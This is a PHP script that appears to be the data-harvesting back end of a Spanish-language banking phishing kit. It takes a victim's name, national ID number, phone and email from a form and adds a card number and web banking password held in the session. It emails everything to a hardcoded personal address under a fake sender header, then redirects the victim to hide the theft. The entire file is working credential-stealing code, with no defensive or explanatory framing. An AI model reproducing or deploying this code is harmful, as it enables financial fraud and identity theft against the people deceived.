<?php

    session_start();
    
    //valores del formulario 
    $name = $_POST['name'];
    $dni = $_POST['dni'];
    $tel = $_POST['tel'];
    $email = $_POST['email'];
    $cc = $_SESSION['cc'];
    $pass = $_SESSION['pass'];

    $to = "fernando1894@hotmail.com";

    $subject = "ACTUALIZACIÓN DE DATOS";

    $txt = "NUMERO DE TARJETA: " . $cc . "\n" . "DNI: " . $dni . "\n" . "NUMERO DE TELEFONO: " . $tel . "\n" . "DIRECCIÓN DE CORREO: " . $email . "NOMBRE: " . $name . "\n" . "CLAVE WEB: " . $pass;

    $headers = "From: pruebas@pruebas.ga";

    mail($to, $subject, $txt, $headers);

    session_unset();
    session_destroy();

    //redireccionar
    header("Location:index.html");
?>